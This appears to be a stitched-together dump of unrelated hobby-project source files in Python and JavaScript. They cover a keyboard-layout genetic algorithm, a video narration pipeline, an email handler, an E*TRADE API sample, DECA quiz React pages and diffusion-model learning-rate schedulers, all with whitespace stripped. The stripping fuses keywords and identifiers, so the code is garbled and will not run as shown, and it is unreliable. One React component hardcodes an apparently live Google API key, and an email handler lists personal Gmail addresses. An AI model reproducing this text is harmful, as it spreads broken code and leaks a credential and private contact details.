importmatplotlib.pyplotaspltfrompointsimportread_pointsfromvisualizeimportplot_circles_and_pointsCIRCLE=50POINT=1RADIUS_DEGREE=3classCircle:def__init__(self,x,y,r):self.x=xself.y=yself.r=rdef__repr__(self):returnf'({self.x},{self.y})|{self.r}'def__contains__(self,point):x,y=pointreturn(x-self.x)**2+(y-self.y)**2<=self.r**2@propertydefcost(self):returnself.r**RADIUS_DEGREE+CIRCLEdefread_circles(file:str):withopen(file)asf:lines=f.readlines()circles=[Circle(*map(float,line.split()))forlineinlines]returncirclesdefvalid_point(point:tuple,circles:list)->bool:forcircleincircles:ifpointincircle:returnTruereturnFalsedefscore(circles:list,points:list)->int:total=0forpointinpoints:ifvalid_point(point,circles):total+=POINTforcircleincircles:total-=circle.costreturntotalif__name__=='__main__':circles=read_circles('circles.txt')points=read_points('points.txt')#print(score(circles,points))fig,ax=plot_circles_and_points(circles,points)plt.show()importPagefrom'@/components/Page';//importSidebar,{SidebarItem}from'@/components/Sidebar';import{faBarChart}from'@fortawesome/free-solid-svg-icons';import{Sidebar,Menu,MenuItem,SubMenu}from'react-pro-sidebar';constFinance=()=>{return(<Pagedata_cluster='Finance'cluster='finance'/>);};exportdefaultFinance;importrandomfromkeyboardimportLayoutimportnltkfromconcurrent.futuresimportThreadPoolExecutorPOPULATION_SIZE=20GENERATIONS=2000MUTATION_RATE=0.2CORPUS=''.join(nltk.corpus.brown.words())[:1000]#CORPUS=open('corpus/output.txt','r',encoding='utf-8').read()[:1000]KEEP_RATE=0.5population=[Layout()for_inrange(POPULATION_SIZE)]#forgenerationinrange(GENERATIONS):static=0previous_fitness=float('-inf')generation=0while(static<1000):#[layout.set_fitness(CORPUS)forlayoutinpopulation]withThreadPoolExecutor(max_workers=POPULATION_SIZE)asexecutor:executor.map(lambdalayout:layout.set_fitness(CORPUS),population)population.sort(key=lambdalayout:layout.fitness,reverse=True)best=population[0].fitnessif(best==previous_fitness):static+=1else:static=0previous_fitness=bestprint(f'Generation{generation}:{population[0].fitness}')keep=int(POPULATION_SIZE*KEEP_RATE)new_population=population[:keep]for_inrange(POPULATION_SIZE-keep):parent1,parent2=random.sample(population,2)child=Layout.crossover(parent1,parent2)child.mutate(MUTATION_RATE)new_population.append(child)population=new_populationgeneration+=1population[0].visualize()population[0].dump('keyboards/keyboard.pkl')frommoviepy.editorimport*frompydubimportAudioSegmentfromscipy.ioimportwavfilenarration=AudioSegment.from_wav('outputs/narration/section_0.wav')music=AudioSegment.from_wav('outputs/music/section_0.wav')combined=narration.overlay(music,format='wav')combined.export('outputs/combined/section_0.wav',format='wav')image=ImageClip('outputs/images/section_0.png')audio=AudioFileClip('outputs/combined/section_0.wav')video=CompositeVideoClip([image.set_duration(audio.duration).set_audio(audio)])video.write_videofile('outputs/videos/section_0.mp4',codec='libx264',audio_codec='aac',fps=24)importnodemailerfrom'nodemailer';consthandler=async(req,res)=>{const{values}=req.body;constadminEmails=['nathandai2000@gmail.com','wenche958@gmail.com','endurascribe@gmail.com',];consttransporter=nodemailer.createTransport({service:'gmail',auth:{user:process.env.EMAIL_USER,pass:process.env.EMAIL_PASS,},});//Sendanemailtotheuserawaittransporter.sendMail({from:`CharlesfromEnduraScribe<${process.env.EMAIL_USER}>`,to:values['email'],subject:values['send_subject'],text:values['content'],});//Sendanemailtotheadminletsubject,text;switch(values['type']){case'order':subject=`Neworderof${values['quantity']}${values['product']}`;text=JSON.stringify(values,null,2);break;case'contact':subject=`Newmessagefrom${values['name']}at${values['email']}`;text=`Subject:${values['subject']}\n\nBody:\n${values['body']}`;break;}awaittransporter.sendMail({from:`CharlesfromEnduraScribe<${process.env.EMAIL_USER}>`,to:adminEmails.join(','),subject:subject,text:text,});res.status(200).json({message:'Emailsent'});};exportdefaulthandler;defplay(total:int,picks:list)->list[list[int]]:if(total==0):return[[]]if(total<min(picks)):return[[total]]games=[]forpickinpicks:if(total-pick>=0):forgameinplay(total-pick,picks):games.append([pick]+game)returngamesgames=play(5,[1,2,3])print(games)forgameingames:nim_sum=0forsizeingame:nim_sum^=sizeprint(f"Game:{game},Nim-Sum:{nim_sum}")importosimportdotenvdotenv.load_dotenv()api_key=os.getenv('GEMINI_API_KEY')importtyping_extensionsastximportgoogle.generativeaiasgenaigenai.configure(api_key=api_key)#withopen('scripts/prompts/generate_topic.txt')asf:#prompt=f.read()prompt='''iamtryingtopracticeimpromptuspeaking.generateonespeakingtopicsthataretopicsthatarewellknownanddebatableandhavetwosidestotheargumentandnocorrectanswer.hereisanexampleofquestionsthatyoushouldgenerate.inyouractualresponse,onlyoutputasinglequestion:[{"question":"Shouldsocialmediaplatformsberegulatedbythegovernment?","viewpoint1":"Regulationprotectsagainstmisinformationandharmfulcontent.","viewpoint2":"Itcouldlimitfreespeechandinnovation."},{"question":"Isitethicaltouseanimalsfortestingmedicalproducts?","viewpoint1":"Animaltestingisnecessaryforscientificprogressandsafety.","viewpoint2":"Itisinhumaneandoutdated."},{"question":"Doestechnologymakeusmorealoneormoreconnected?","viewpoint1":"Technologyconnectspeopleglobally.","viewpoint2":"Itreplacesdeep,meaningfulin-personrelationships."},{"question":"Shouldcollegeeducationbefreeforeveryone?","viewpoint1":"Freecollegeincreasesopportunitiesforall.","viewpoint2":"Itmayreduceeducationalqualityandbefinanciallyunsustainable."},{"question":"Isthedeathpenaltyaneffectivedeterrenttocrime?","viewpoint1":"Thedeathpenaltydetersseverecrime.","viewpoint2":"Thereisnoevidenceofdeterrenceanditriskswrongfulexecutions."},{"question":"Isitbettertoprioritizeprivacyorsecurityintoday’sdigitalage?","viewpoint1":"Securityiscrucialforpublicsafety.","viewpoint2":"Excessivesurveillancethreatensprivacyandfreedom."},{"question":"Dovideogamescontributetoyouthviolence?","viewpoint1":"Violentvideogamesdesensitizeyoungpeople.","viewpoint2":"Thereisnoconclusivelinktoreal-worldviolence."},{"question":"Isartificialintelligencemoreofabenefitorathreattosociety?","viewpoint1":"AImakestasksmoreefficientanddrivesinnovation.","viewpoint2":"AIcouldleadtojobdisplacementandposesethicalrisks."},{"question":"Shouldweimplementauniversalbasicincome?","viewpoint1":"UBIreducespovertyandsupportspeopleduringunemployment.","viewpoint2":"Itistooexpensiveandcoulddisincentivizework."},{"question":"Isclimatechangearesponsibilityofindividualsorcorporations?","viewpoint1":"Individualsshouldreducetheircarbonfootprint.","viewpoint2":"Corporationshavethebiggestimpactandshouldleadtheway."},{"question":"Shouldtherebelimitsonfreedomofspeech?","viewpoint1":"Limitspreventhatespeechandviolence.","viewpoint2":"Anyrestrictiononspeechthreatensdemocracy."},{"question":"Doestheschoolsystemkillcreativity?","viewpoint1":"Theemphasisontestingstiflescreativity.","viewpoint2":"Structureandfoundationalknowledgearenecessaryforgrowth."},{"question":"Shouldwealthycountriesberequiredtosharevaccinesorresourcesduringglobalcrises?","viewpoint1":"Wealthycountrieshaveamoralresponsibilitytoshare.","viewpoint2":"Countriesshouldprioritizetheirowncitizensfirst."},{"question":"Arestandardizedtestsaneffectivemeasureofstudentability?","viewpoint1":"Standardizedtestsprovideanobjectivemetric.","viewpoint2":"Theyfailtocaptureastudent’strueabilitiesandpotential."},{"question":"Iscancelcultureanecessaryformofaccountabilityoradangeroustrend?","viewpoint1":"Cancelcultureholdspeopleaccountableforharmfulactions.","viewpoint2":"Itactsasmobjusticewithnoroomforredemption."},{"question":"Shouldwegiveprioritytoeconomicgrowthoverenvironmentalprotection?","viewpoint1":"Economicgrowthimprovesqualityoflife.","viewpoint2":"Neglectingtheenvironmentcauseslong-termdamage."},{"question":"Istheuseofsurveillancecamerasaninvasionofprivacyoranecessityforsafety?","viewpoint1":"Surveillancecamerasincreasepublicsafety.","viewpoint2":"Theyinfringeonprivacyrights."},{"question":"Shouldgeneticallymodifiedfoodsbebanned?","viewpoint1":"GMfoodsincreasefoodproductionandimprovenutrition.","viewpoint2":"Therearefearsofhealthrisksandenvironmentalimpacts."},{"question":"Isremoteworkbetterforproductivitythanin-officework?","viewpoint1":"Remoteworkoffersflexibilityandcomfort.","viewpoint2":"In-officeworkfostersbettercollaborationandfocus."},{"question":"Shouldsocialmediainfluencersbeheldtostricterethicalguidelines?","viewpoint1":"Stricterguidelinesprotectconsumersfrommisinformation.","viewpoint2":"Itwouldlimitcreativityandfreedomofexpression."}]'''model=genai.GenerativeModel("gemini-1.5-pro-latest")result=model.generate_content(prompt,generation_config=genai.GenerationConfig(response_mime_type='application/json'),)print(result.text.replace('\n',''))letpara=document.querySelector("#resumeDoc>div:nth-child(3)>div.document.doc-root.fontsize.fontface.vmargins.hmargins.pagesize.skn-cnt1.CNT1.MPR>div.parent-wrapper>div.sortable-item.section-container.data-SUMM>div:nth-child(2)>div>div.doc-item>div.heading>div")letcompStyles=window.getComputedStyle(para);letfontSize=compStyles.getPropertyValue('font-size');letfontFamily=compStyles.getPropertyValue('font-family');letfontWeight=compStyles.getPropertyValue('font-weight');letfontStyle=compStyles.getPropertyValue('font-style');letcolor=compStyles.getPropertyValue('color');letletterSpacing=compStyles.getPropertyValue('letter-spacing');console.log(fontSize,fontFamily,fontWeight,fontStyle,color,letterSpacing);"""ThisPythonscriptprovidesexamplesonusingtheE*TRADEAPIendpoints"""from__future__importprint_functionimportwebbrowserimportjsonimportloggingimportconfigparserimportsysimportrequestsfromrauthimportOAuth1Servicefromlogging.handlersimportRotatingFileHandlerfromaccounts.accountsimportAccountsfrommarket.marketimportMarket#loadingconfigurationfileconfig=configparser.ConfigParser()config.read('config.ini')#loggersettingslogger=logging.getLogger('my_logger')logger.setLevel(logging.DEBUG)handler=RotatingFileHandler("python_client.log",maxBytes=5*1024*1024,backupCount=3)FORMAT="%(asctime)-15s%(message)s"fmt=logging.Formatter(FORMAT,datefmt='%m/%d/%Y%I:%M:%S%p')handler.setFormatter(fmt)logger.addHandler(handler)defoauth():"""AllowsuserauthorizationforthesampleapplicationwithOAuth1"""etrade=OAuth1Service(name="etrade",consumer_key=config["DEFAULT"]["CONSUMER_KEY"],consumer_secret=config["DEFAULT"]["CONSUMER_SECRET"],request_token_url="https://api.etrade.com/oauth/request_token",access_token_url="https://api.etrade.com/oauth/access_token",authorize_url="https://us.etrade.com/e/t/etws/authorize?key={}&token={}",base_url="https://api.etrade.com")menu_items={"1":"SandboxConsumerKey","2":"LiveConsumerKey","3":"Exit"}whileTrue:print("")options=menu_items.keys()forentryinoptions:print(entry+")\t"+menu_items[entry])selection=input("PleaseselectConsumerKeyType:")ifselection=="1":base_url=config["DEFAULT"]["SANDBOX_BASE_URL"]breakelifselection=="2":base_url=config["DEFAULT"]["PROD_BASE_URL"]breakelifselection=="3":breakelse:print("UnknownOptionSelected!")print("")#Step1:GetOAuth1requesttokenandsecretrequest_token,request_token_secret=etrade.get_request_token(params={"oauth_callback":"oob","format":"json"})#Step2:Gothroughtheauthenticationflow.LogintoE*TRADE.#Afteryoulogin,thepagewillprovideaverificationcodetoenter.authorize_url=etrade.authorize_url.format(etrade.consumer_key,request_token)webbrowser.open(authorize_url)text_code=input("Pleaseacceptagreementandenterverificationcodefrombrowser:")#Step3:ExchangetheauthorizedrequesttokenforanauthenticatedOAuth1sessionsession=etrade.get_auth_session(request_token,request_token_secret,params={"oauth_verifier":text_code})main_menu(session,base_url)defmain_menu(session,base_url):"""Providesthedifferentoptionsforthesampleapplication:MarketQuotes,AccountList:paramsession:authenticatedsession"""menu_items={"1":"MarketQuotes","2":"AccountList","3":"Exit"}whileTrue:print("")options=menu_items.keys()forentryinoptions:print(entry+")\t"+menu_items[entry])selection=input("Pleaseselectanoption:")ifselection=="1":market=Market(session,base_url)market.quotes()elifselection=="2":accounts=Accounts(session,base_url)accounts.account_list()elifselection=="3":breakelse:print("UnknownOptionSelected!")if__name__=="__main__":oauth()constGamesList=()=>{return<h1>GamesList</h1>;};exportdefaultGamesList;constexpress=require('express');constrouter=express.Router();constusersController=require('../controllers/usersController');router.route('/').get(usersController.getAllUsers).post(usersController.createNewUser).patch(usersController.updateUser).delete(usersController.deleteUser);module.exports=router;importunittestclassSolution:defisPalindrome(self,s:str)->bool:s=''.join(filter(str.isalnum,s)).lower()ifnot(s):returnTrueleft=0right=len(s)-1while(left<right):if(s[left]!=s[right]):returnFalseleft+=1right-=1returnTrueclassTestIsPalindrome(unittest.TestCase):defsetUp(self):self.sol=Solution()deftest_is_palindrome_1(self):self.assertTrue(self.sol.isPalindrome("Aman,aplan,acanal:Panama"))deftest_is_palindrome_2(self):self.assertFalse(self.sol.isPalindrome("raceacar"))deftest_is_palindrome_3(self):self.assertTrue(self.sol.isPalindrome(""))unittest.main()fromtypingimportDict,Unionimporttorchimporttorch.nnasnnfrom...utilimportappend_dims,instantiate_from_configfrom.denoiser_scalingimportDenoiserScalingfrom.discretizerimportDiscretizationclassDenoiser(nn.Module):def__init__(self,scaling_config:Dict):super().__init__()self.scaling:DenoiserScaling=instantiate_from_config(scaling_config)defpossibly_quantize_sigma(self,sigma:torch.Tensor)->torch.Tensor:returnsigmadefpossibly_quantize_c_noise(self,c_noise:torch.Tensor)->torch.Tensor:returnc_noisedefforward(self,network:nn.Module,input:torch.Tensor,sigma:torch.Tensor,cond:Dict,**additional_model_inputs,)->torch.Tensor:sigma=self.possibly_quantize_sigma(sigma)sigma_shape=sigma.shapesigma=append_dims(sigma,input.ndim)c_skip,c_out,c_in,c_noise=self.scaling(sigma)c_noise=self.possibly_quantize_c_noise(c_noise.reshape(sigma_shape))return(network(input*c_in,c_noise,cond,**additional_model_inputs)*c_out+input*c_skip)classDiscreteDenoiser(Denoiser):def__init__(self,scaling_config:Dict,num_idx:int,discretization_config:Dict,do_append_zero:bool=False,quantize_c_noise:bool=True,flip:bool=True,):super().__init__(scaling_config)self.discretization:Discretization=instantiate_from_config(discretization_config)sigmas=self.discretization(num_idx,do_append_zero=do_append_zero,flip=flip)self.register_buffer("sigmas",sigmas)self.quantize_c_noise=quantize_c_noiseself.num_idx=num_idxdefsigma_to_idx(self,sigma:torch.Tensor)->torch.Tensor:dists=sigma-self.sigmas[:,None]returndists.abs().argmin(dim=0).view(sigma.shape)defidx_to_sigma(self,idx:Union[torch.Tensor,int])->torch.Tensor:returnself.sigmas[idx]defpossibly_quantize_sigma(self,sigma:torch.Tensor)->torch.Tensor:returnself.idx_to_sigma(self.sigma_to_idx(sigma))defpossibly_quantize_c_noise(self,c_noise:torch.Tensor)->torch.Tensor:ifself.quantize_c_noise:returnself.sigma_to_idx(c_noise)else:returnc_noiseimportReactfrom'react';constfaqs=[{question:'WhatisDECAanditsmainobjective?',answer:'DECAisaninternationalassociationofhighschoolandcollegestudentsaimedatpreparingemergingleadersandentrepreneursinmarketing,finance,hospitality,andmanagement.'},{question:'HowcanIjointheDECAclub?',answer:'StudentscanjoinDECAbysigningupduringtheclubrecruitmentperiodatthebeginningoftheacademicyearorcontactingtheclubofficersformoredetails.'},{question:'WhattypesofactivitiesandeventsdoesDECAorganize?',answer:'DECAorganizesavarietyofactivitiesincludingbusinesscompetitions,leadershipconferences,communityserviceprojects,andworkshopswithindustryprofessionals.'},{question:'ArethereanyprerequisitestojoinDECA?',answer:'TherearenospecificprerequisitestojoinDECA.However,akeeninterestinbusiness,entrepreneurship,andleadershipishighlybeneficial.'},{question:'HowdoesDECApreparestudentsforprofessionalcareers?',answer:'DECAprovidespracticalexperiencesthroughcompetitionsandnetworkingevents,helpingstudentsdevelopskillsincommunication,leadership,andbusinessmanagement.'},{question:'WhatareDECAcompetitiveeventslike?',answer:'DECA’scompetitiveeventschallengestudentsinvariousbusinessscenarios,includingroleplays,writtenprojects,andpresentations,judgedbyindustryprofessionals.'},{question:'ArethereleadershipopportunitieswithinDECA?',answer:'Yes,studentscantakeonleadershiprolesatlocal,state,andinternationallevels,gaininginvaluableexperienceinmanagingteams,projects,andevents.'},];exportdefaultfunctionFAQs(){return(<divid="FAQs"className="mx-automax-w-7xlpx-2sm:px-6lg:px-8pb-10"><h1className="text-4xlfont-boldmb-10text-blue-500">FrequentlyAskedQuestions</h1>{faqs.map((faq,index)=>(<divkey={index}className="mb-6"><h2className="text-xlfont-semiboldmb-2">{faq.question}</h2><pclassName="text-mdtext-gray-700">{faq.answer}</p></div>))}</div>);}fromsetuptoolsimportsetup,find_packagesimportosif__name__=="__main__":def_read_reqs(relpath):fullpath=os.path.join(os.path.dirname(__file__),relpath)withopen(fullpath)asf:return[s.strip()forsinf.readlines()if(s.strip()andnots.startswith("#"))]setup(name="sdata",version="0.0.1",description="",packages=find_packages(),#install_requires=REQUIREMENTS,py_modules=["sdata"],)importjsonimportpathlibimportpandasaspdfromhashlibimportmd5current=pathlib.Path(__file__).parent.absolute()defdf_to_json(df,path:str):category_gb=df.groupby('Category')data={}forcategory,groupincategory_gb:data[category]=[{'id':md5((str(row['Question'])+str(row['A'])+str(row['B'])+str(row['C'])+str(row['D'])+str(row['Explanation'])+str(category)).encode()).hexdigest(),'question':row['Question'],'options':[row['A'],row['B'],row['C'],row['D']],'correctAnswerIndex':row['Answer'],'explanation':row['Explanation'].lstrip(),}for_,rowingroup.iterrows()]withopen(current/path,'w')asf:json.dump(data,f,indent=2)if__name__=='__main__':path=current/'DECADash.xlsx'df=pd.read_excel(path)df_to_json(df,'data.json')import{Inter}from"next/font/google";import"./globals.css";constinter=Inter({subsets:["latin"]});exportconstmetadata={title:"Instagram",description:"Instagram",};exportdefaultfunctionRootLayout({children}){return(<htmllang="en"><head><linkrel="icon"href="/favicon.png"/></head><bodyclassName={inter.className}>{children}</body></html>);}importunittestclassSolution:defcubic(self,nums:list[int])->int:largest=float('-inf')foriinrange(len(nums)):forjinrange(i,len(nums)):total=sum(nums[i:j+1])if(total>largest):largest=totalreturnlargestdefquadratic(self,nums:list[int])->int:largest=float('-inf')foriinrange(len(nums)):total=0forjinrange(i,len(nums)):total+=nums[j]if(total>largest):largest=totalreturnlargestdefmaxSubArray(self,nums:list[int])->int:total=0largest=-float('inf')forendinrange(len(nums)):total+=nums[end]if(total>largest):largest=totalif(total<0):total=0returnlargestclassTestSolution(unittest.TestCase):defsetUp(self):self.solution=Solution()deftest_maxSubArray(self):self.assertEqual(self.solution.maxSubArray([-2,1,-3,4,-1,2,1,-5,4]),6)self.assertEqual(self.solution.maxSubArray([1]),1)self.assertEqual(self.solution.maxSubArray([5,4,-1,7,8]),23)unittest.main()importAutocompleteInputfrom'./AutocompleteInput';constClassesForm=({classes,setClasses,nextStep,prevStep,addClass})=>{return(<div><h2className='text-center'>Whatclassesareyoutaking?</h2><AutocompleteInputaddClass={addClass}k={5}/><divclassName='mt-4'>{classes.map((cls,i)=>(<spankey={i}className='bg-gray-200py-2px-4mr-2mb-2rounded-lginline-blockgrouphover:cursor-pointerhover:bg-gray-300'onClick={()=>setClasses(classes.filter((_,index)=>index!==i))}><span>{cls}</span><buttonclassName='text-gray-200group-hover:text-gray-700ml-2transition-colorsduration-100ease-out'>&times;</button></span>))}</div><divclassName='flexmt-4'><buttonclassName='bg-gray-500text-whitepy-2w-1/2roundedm-1hover:bg-gray-700transition-colorsduration-100ease-out'onClick={prevStep}>Back</button><buttonclassName='bg-gray-500text-whitepy-2w-1/2roundedm-1hover:bg-gray-700transition-colorsduration-100ease-out'onClick={nextStep}>Next</button></div></div>);};exportdefaultClassesForm;//Next.jsAPIroutesupport:https://nextjs.org/docs/api-routes/introductionexportdefaultfunctionhandler(req,res){res.status(200).json({name:'JohnDoe'})}constGameUploadForm=()=>{consthandleSubmit=(e)=>{};return(<formonSubmit={handleSubmit}id='pgn-form'><inputtype='text'id='pgn-input'name='pgn'placeholder='EnterPGN'className='form__field'/><buttontype='submit'className='btnbtn--primarybtn--inside'>Submit</button></form>);};exportdefaultGameUploadForm;fromdatetimeimportdatetime,date,timedeltafromiteratorsimportpairwisefromscheduleimport*EVEN=date(2023,8,29)defis_school_day(day:date=date.today())->bool:if(day.weekday()>=5):returnFalseif(dayinSKIP):returnFalsereturnTruedefeven_odd(day:date=date.today())->int:start=EVENtotal=0while(start<day):start+=timedelta(days=1)if(startnotinSKIPandstart.weekday()<5):total+=1returntotal%2defget_day_progress_from_datetime(now:datetime=datetime.now())->float:if(now.date().weekday()>=5):returnNoneif(now.date()inSKIP):returnNonestart=datetime(now.year,now.month,now.day,PERIOD_TIMES[0].start.hour,PERIOD_TIMES[0].start.minute)end=datetime(now.year,now.month,now.day,PERIOD_TIMES[-1].end.hour,PERIOD_TIMES[-1].end.minute)progress=(now-start)/(end-start)if(progress<0):return0if(progress>1):return1returnprogressdefget_period_progress_from_datetime(now:datetime=datetime.now())->float:fortimeinPERIOD_TIMES:start=datetime.combine(now.date(),time.start)end=datetime.combine(now.date(),time.end)if(start<=now<=end):return(now-start)/(end-start)returnNonedefget_period_and_class_from_datetime(now:datetime=datetime.now())->tuple[int,str]:if(now.date().weekday()>=5):return(None,NO_CLASS)day_classes=ODD_PERIODSifeven_odd(now.date())elseEVEN_PERIODSfortime,periodinzip(PERIOD_TIMES,day_classes):if(time.start<=now.time()<=time.end):return(period,CLASSES[period])if(PERIOD_TIMES[0].start<=now.time()<=PERIOD_TIMES[-1].end):return(None,PASSING_PERIOD)return(None,NO_CLASS)importnumpyasnpclassLambdaWarmUpCosineScheduler:"""note:usewithabase_lrof1.0"""def__init__(self,warm_up_steps,lr_min,lr_max,lr_start,max_decay_steps,verbosity_interval=0,):self.lr_warm_up_steps=warm_up_stepsself.lr_start=lr_startself.lr_min=lr_minself.lr_max=lr_maxself.lr_max_decay_steps=max_decay_stepsself.last_lr=0.0self.verbosity_interval=verbosity_intervaldefschedule(self,n,**kwargs):ifself.verbosity_interval>0:ifn%self.verbosity_interval==0:print(f"currentstep:{n},recentlr-multiplier:{self.last_lr}")ifn<self.lr_warm_up_steps:lr=(self.lr_max-self.lr_start)/self.lr_warm_up_steps*n+self.lr_startself.last_lr=lrreturnlrelse:t=(n-self.lr_warm_up_steps)/(self.lr_max_decay_steps-self.lr_warm_up_steps)t=min(t,1.0)lr=self.lr_min+0.5*(self.lr_max-self.lr_min)*(1+np.cos(t*np.pi))self.last_lr=lrreturnlrdef__call__(self,n,**kwargs):returnself.schedule(n,**kwargs)classLambdaWarmUpCosineScheduler2:"""supportsrepeatediterations,configurablevialistsnote:usewithabase_lrof1.0."""def__init__(self,warm_up_steps,f_min,f_max,f_start,cycle_lengths,verbosity_interval=0):assert(len(warm_up_steps)==len(f_min)==len(f_max)==len(f_start)==len(cycle_lengths))self.lr_warm_up_steps=warm_up_stepsself.f_start=f_startself.f_min=f_minself.f_max=f_maxself.cycle_lengths=cycle_lengthsself.cum_cycles=np.cumsum([0]+list(self.cycle_lengths))self.last_f=0.0self.verbosity_interval=verbosity_intervaldeffind_in_interval(self,n):interval=0forclinself.cum_cycles[1:]:ifn<=cl:returnintervalinterval+=1defschedule(self,n,**kwargs):cycle=self.find_in_interval(n)n=n-self.cum_cycles[cycle]ifself.verbosity_interval>0:ifn%self.verbosity_interval==0:print(f"currentstep:{n},recentlr-multiplier:{self.last_f},"f"currentcycle{cycle}")ifn<self.lr_warm_up_steps[cycle]:f=(self.f_max[cycle]-self.f_start[cycle])/self.lr_warm_up_steps[cycle]*n+self.f_start[cycle]self.last_f=freturnfelse:t=(n-self.lr_warm_up_steps[cycle])/(self.cycle_lengths[cycle]-self.lr_warm_up_steps[cycle])t=min(t,1.0)f=self.f_min[cycle]+0.5*(self.f_max[cycle]-self.f_min[cycle])*(1+np.cos(t*np.pi))self.last_f=freturnfdef__call__(self,n,**kwargs):returnself.schedule(n,**kwargs)classLambdaLinearScheduler(LambdaWarmUpCosineScheduler2):defschedule(self,n,**kwargs):cycle=self.find_in_interval(n)n=n-self.cum_cycles[cycle]ifself.verbosity_interval>0:ifn%self.verbosity_interval==0:print(f"currentstep:{n},recentlr-multiplier:{self.last_f},"f"currentcycle{cycle}")ifn<self.lr_warm_up_steps[cycle]:f=(self.f_max[cycle]-self.f_start[cycle])/self.lr_warm_up_steps[cycle]*n+self.f_start[cycle]self.last_f=freturnfelse:f=self.f_min[cycle]+(self.f_max[cycle]-self.f_min[cycle])*(self.cycle_lengths[cycle]-n)/(self.cycle_lengths[cycle])self.last_f=freturnf//ImprovedVersionofFeedbackSummaryComponentwithEnhancedStyling'useclient';import{useState,useEffect}from'react';import{useRouter}from'next/navigation';import{GoogleGenerativeAI}from'@google/generative-ai';constSummary=()=>{const[history,setHistory]=useState([]);const[summary,setSummary]=useState('');const[topic,setTopic]=useState('');constrouter=useRouter();//InitializeGoogleGenerativeAImodelconstgenAI=newGoogleGenerativeAI('AIzaSyDRwIal7m0dpzSsMchvzKuPxXZnYe8ZD54');constmodel=genAI.getGenerativeModel({model:'gemini-1.5-pro-latest',generationConfig:{responseSchema:{type:'object',properties:{text:{type:'string'}},},temperature:2,},});useEffect(()=>{//RetrievehistoryandtopicfromlocalStorageconststoredHistory=localStorage.getItem('history');conststoredTopic=localStorage.getItem('topic');if(storedHistory){setHistory(storedHistory);//Improvedprompttospecifysummarydetailsconstprompt=`Pleasecreateaconcisesummaryofthefeedbackprovidedbythejudgesbasedonthetranscriptbelow.Considerthefollowingpointsforagoodsummary:-Focusonthekeypositiveandnegativefeedback.-Highlightsuggestionsforimprovement.-Provideanoverallimpressiongivenbythejudges.Transcript:${storedHistory}`;generateSummary(prompt);}if(storedTopic){setTopic(storedTopic);}},[]);//FunctiontogeneratesummaryfromthegenerativemodelconstgenerateSummary=async(prompt)=>{try{constresult=awaitmodel.generateContent(prompt);setSummary(result.response.text().trim());}catch(error){console.error('Errorgeneratingsummary:',error);}};conststyle={position:'fixed',top:0,left:0,width:'100%',height:'100%',backgroundColor:'#e0eef2',backgroundImage:`url("data:image/svg+xml,%3Csvgxmlns='http://www.w3.org/2000/svg'viewBox='00100100'transform='rotate(30)'%3E%3Ctextx='25'y='75'font-size='40'%3E%3C/text%3E%3C/svg%3E"),url("data:image/svg+xml,%3Csvgxmlns='http://www.w3.org/2000/svg'viewBox='00100100'transform='rotate(30)'%3E%3Ctextx='25'y='75'font-size='40'%3E%3C/text%3E%3C/svg%3E")`,backgroundRepeat:'repeat',backgroundSize:'300px300px',backgroundPosition:'00,150px150px',//Staggeredpositionforsecondlayeranimation:'float360slinearinfinite',filter:'brightness(1.3)contrast(0.7)sepia(0.1)opacity(0.7)',//"Lifted"whiteseffectzIndex:-1,};return(<><divstyle={style}></div><divclassName='flexflex-colitems-centerp-8min-h-screenbg-gray-100'><divclassName='w-fullmax-w-3xlbg-whiterounded-lgshadow-mdp-8mt-12'><h1className='text-3xlfont-boldtext-centermb-6'>TopicQuestion</h1><divclassName='bg-blue-50p-4rounded-mdmb-6'><h2className='text-xlfont-semibold'>{topic||'Loadingtopic...'}</h2></div><h2className='text-2xlfont-semiboldmb-4'>SummaryofFeedback</h2><divclassName='bg-gray-50p-6rounded-md'><pclassName='text-lgtext-gray-700'>{summary||'Loadingsummary...'}</p></div></div><divclassName='w-fullmax-w-3xlmt-8flexjustify-end'><buttonclassName='bg-blue-500text-whitepy-2px-4roundedhover:bg-blue-600transition-all'onClick={()=>router.push('/')}>RunitBack!</button></div></div></>);};exportdefaultSummary;context='Wearemakinganappwhereuserscaninputthetextofabookandgetvisualdepictions,real-timenarration,andlivemusicthroughouteachchapterofthebooktogiveanewvisualexperiencetoreaders.'import{useState,useEffect}from'react';import{React}from'react';import{doc,onSnapshot,updateDoc}from'firebase/firestore';import{db}from'@/firebase/firebase';importdatafrom'../data/data.json';import{FontAwesomeIcon}from'@fortawesome/react-fontawesome';import{faTrash}from'@fortawesome/free-solid-svg-icons';constQuestionList=({userId})=>{const[allCompletedQuestions,setAllCompletedQuestions]=useState({});const[allMissedQuestions,setAllMissedQuestions]=useState({});constclusters=['finance','hospitalityTourism','marketing','businessManagementAdministration','personalFinancialLiteracy','entrepreneurship',];constclusterDataMap={finance:'Finance',hospitalityTourism:'HospitalityandTourism',marketing:'Marketing',businessManagementAdministration:'BusinessManagementandAdministration',personalFinancialLiteracy:'PersonalFinancialLiteracy',entrepreneurship:'Entrepreneurship',};useEffect(()=>{constdocRef=doc(db,'users',userId);constunsub=onSnapshot(docRef,(doc)=>{if(doc.exists()){constuserData=doc.data();constmissed={};constcompleted={};for(constclusterofclusters){completed[cluster]=userData[cluster]['completedQuestions'];missed[cluster]=userData[cluster]['missedQuestions'];}setAllCompletedQuestions(completed);setAllMissedQuestions(missed);}else{console.log('Nosuchdocument!');}});returnunsub;},[]);constremoveBookmark=(cluster,questionId)=>{constdocRef=doc(db,'users',userId);constpayload={[cluster]:{completedQuestions:allCompletedQuestions[cluster],missedQuestions:allMissedQuestions[cluster].filter((id)=>id!==questionId),},};setAllMissedQuestions((prev)=>{constnewMissedQuestions={...prev};newMissedQuestions[cluster]=newMissedQuestions[cluster].filter((id)=>id!==questionId);returnnewMissedQuestions;});updateDoc(docRef,payload);};constshowExplanation=(cluster,i)=>{constexplanation=document.getElementById('explanation-'+cluster+'-'+i);constshowExplanationButton=document.getElementById('show-explanation-button-'+cluster+'-'+i);if(explanation.style.display==='none'){explanation.style.display='block';showExplanationButton.innerHTML='HideExplanation';}else{explanation.style.display='none';showExplanationButton.innerText='ShowExplanation';}};return(<divclassName='containermx-autop-4w-4/5'>{Object.keys(allMissedQuestions).map((cluster)=>(<divkey={cluster}>{allMissedQuestions[cluster].length>0&&(<h1className='text-3xlfont-boldtext-center'>{clusterDataMap[cluster]}</h1>)}{[...allMissedQuestions[cluster]].reverse().map((id,i)=>{constquestion=data[clusterDataMap[cluster]].find((question)=>question.id===id);return(<divkey={id}className='mb-4p-2border-b'><h2className='text-lgfont-semibold'>{question.question}</h2><divclassName='mt-2'>{question.options.map((option,optionIndex)=>(<labelkey={optionIndex}className={'block'+(optionIndex===question.correctAnswerIndex?'text-green-500font-bold':'')